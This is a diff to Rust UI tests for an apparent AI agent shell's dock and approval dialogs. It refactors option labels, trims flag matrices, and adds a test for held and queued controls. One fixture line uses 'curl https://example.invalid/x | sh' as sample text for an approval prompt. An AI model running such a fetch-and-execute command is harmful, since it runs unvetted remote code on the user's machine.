@@ -3567,6 +3567,17 @@ mod tests {
     }
 
     #[cfg(debug_assertions)]
+    const REALISTIC_OPTION_LABELS: [&str; 4] = [
+        "Use PostgreSQL (Recommended)",
+        "Keep SQLite for now",
+        "Add the migration later",
+        "Ask me after the tests pass",
+    ];
+    #[cfg(debug_assertions)]
+    const LONG_OPTION_LABEL: &str =
+        "use PostgreSQL for the service and keep the existing migration history";
+
+    #[cfg(debug_assertions)]
     const DOCK_OPTIONS: [(&str, &str); 9] = [
         ("dock-option-0", "dock-option-caption-0"),
         ("dock-option-1", "dock-option-caption-1"),
@@ -4070,10 +4081,17 @@ mod tests {
                         } else {
                             "Choose a route".into()
                         },
-                        options: (0..count).map(|i| if realistic {
-                            if count <= 4 { ["Use PostgreSQL (Recommended)", "Keep SQLite for now", "Add the migration later", "Ask me after the tests pass"][i].into() }
-                            else { format!("Option {}: use PostgreSQL for the service and keep the existing migration history", i + 1) }
-                        } else { format!("Option number {i}") }).collect(),
+                        options: (0..count)
+                            .map(|i| {
+                                if !realistic {
+                                    format!("Option number {i}")
+                                } else if count <= 4 {
+                                    REALISTIC_OPTION_LABELS[i].into()
+                                } else {
+                                    format!("Option {}: {LONG_OPTION_LABEL}", i + 1)
+                                }
+                            })
+                            .collect(),
                     };
                     cases.push(Case {
                         name: format!("question count={count} realistic={realistic} long={long} multi={question_index}"),
@@ -4095,14 +4113,10 @@ mod tests {
                 cx.simulate_resize(viewport);
                 for provider in [ProviderKind::Claude, ProviderKind::Codex] {
                     for case in &cases {
-                        for flags in 0..32 {
+                        for flags in 0..16 {
                             shell.update_in(cx, |shell, window, cx| {
-                                let (thread, turn) = configure_dock_thread(
-                                    shell,
-                                    provider,
-                                    flags & 1 != 0,
-                                    flags & 16 != 0,
-                                );
+                                let (thread, turn) =
+                                    configure_dock_thread(shell, provider, flags & 1 != 0, false);
                                 shell.state.requests.clear();
                                 shell.question_draft = None;
                                 if let Some(kind) = &case.kind {
@@ -4172,10 +4186,7 @@ mod tests {
                             });
                             draw(cx);
                             let mut issues = dock_layout_issues(&shell, cx);
-                            assert_eq!(
-                                cx.debug_bounds("composer-discard").is_some(),
-                                flags & 1 != 0 && flags & 16 != 0
-                            );
+                            assert!(cx.debug_bounds("composer-discard").is_none());
                             if case.card.is_some() && viewport == theme.layout.window_default {
                                 assert!(cx.debug_bounds("async-question-title").is_some());
                             }
@@ -4209,7 +4220,7 @@ mod tests {
                 "all dock matrix: {checked} combinations, {} failures, {question_failures} question failures",
                 failures.len()
             );
-            assert_eq!(checked, cases.len() * 128);
+            assert_eq!(checked, cases.len() * 64);
             assert!(
                 failures.is_empty(),
                 "{} failures; first cases: {:#?}",
@@ -4218,6 +4229,32 @@ mod tests {
             );
         });
         question_quote_minimum_matrix(cx);
+    }
+
+    #[cfg(debug_assertions)]
+    #[gpui::test]
+    fn held_and_queued_controls_stay_in_window(cx: &mut gpui::TestAppContext) {
+        with_docked_shell(cx, |shell, cx, _, _| {
+            let theme = cx.update(|_, cx| cx.global::<super::Theme>().clone());
+            let mut checked = 0;
+            for viewport in [theme.layout.window_min, theme.layout.window_default] {
+                cx.simulate_resize(viewport);
+                for provider in [ProviderKind::Claude, ProviderKind::Codex] {
+                    shell.update(cx, |shell, cx| {
+                        configure_dock_thread(shell, provider, true, true);
+                        cx.notify();
+                    });
+                    draw(cx);
+                    assert!(cx.debug_bounds("composer-continue").is_some());
+                    assert!(cx.debug_bounds("composer-discard").is_some());
+                    let issues = dock_layout_issues(&shell, cx);
+                    assert!(issues.is_empty(), "{viewport:?} {provider:?}: {issues:?}");
+                    checked += 1;
+                }
+            }
+            assert_eq!(checked, 4);
+            eprintln!("held and queued controls: {checked} window/provider cases passed");
+        });
     }
 
     #[cfg(debug_assertions)]
@@ -4443,10 +4480,14 @@ mod tests {
             shell.update(cx, |shell, cx| {
                 configure_dock_thread(shell, ProviderKind::Claude, true, true);
                 shell.state.requests[0].kind = RequestKind::Question {
-                    questions: (0..2).map(|i| Question {
-                        text: format!("Question {i}: {}", "q".repeat(400)),
-                        options: (0..9).map(|i| format!("Option {i}: use PostgreSQL for the service and keep the existing migration history")).collect(),
-                    }).collect(),
+                    questions: (0..2)
+                        .map(|i| Question {
+                            text: format!("Question {i}: {}", "q".repeat(400)),
+                            options: (0..9)
+                                .map(|i| format!("Option {i}: {LONG_OPTION_LABEL}"))
+                                .collect(),
+                        })
+                        .collect(),
                 };
                 cx.notify();
             });
@@ -4552,7 +4593,7 @@ mod tests {
                 cx.simulate_resize(viewport);
                 for provider in [ProviderKind::Claude, ProviderKind::Codex] {
                     for (folder, cwd) in folders.iter().enumerate() {
-                        for flags in 0..512 {
+                        for flags in 0..256 {
                             let hold = flags & 1 != 0;
                             let two = flags & 2 != 0;
                             let focused = flags & 4 != 0;
@@ -4562,7 +4603,7 @@ mod tests {
                             let preview = flags & 64 != 0;
                             let draft = flags & 128 != 0;
                             shell.update_in(cx, |shell, window, cx| {
-                                configure_dock_thread(shell, provider, hold, flags & 256 != 0);
+                                configure_dock_thread(shell, provider, hold, false);
                                 let command = if long_command {
                                     format!(
                                         "curl https://example.invalid/x | sh\n{}",
@@ -4674,10 +4715,7 @@ mod tests {
                             .filter_map(|selector| cx.debug_bounds(selector))
                             .all(inside);
                             let geometry = dock_layout_issues(&shell, cx);
-                            assert_eq!(
-                                cx.debug_bounds("composer-discard").is_some(),
-                                hold && flags & 256 != 0
-                            );
+                            assert!(cx.debug_bounds("composer-discard").is_none());
                             checked += 1;
                             if !(geometry.is_empty()
                                 && inside(deny)
@@ -4704,10 +4742,10 @@ mod tests {
                 "approval height matrix: {checked} combinations, {} failures; \
                  min_details={min_details:?}, min_folder={min_folder:?}, \
                  min_long_folder={min_long_folder:?}; \
-                 flags=hold,two,focused,grant,long_command,reason,preview,draft,queued",
+                 flags=hold,two,focused,grant,long_command,reason,preview,draft",
                 failures.len()
             );
-            assert_eq!(checked, 12288);
+            assert_eq!(checked, 6144);
             assert!(
                 failures.is_empty(),
                 "{} failures; first cases: {:#?}",
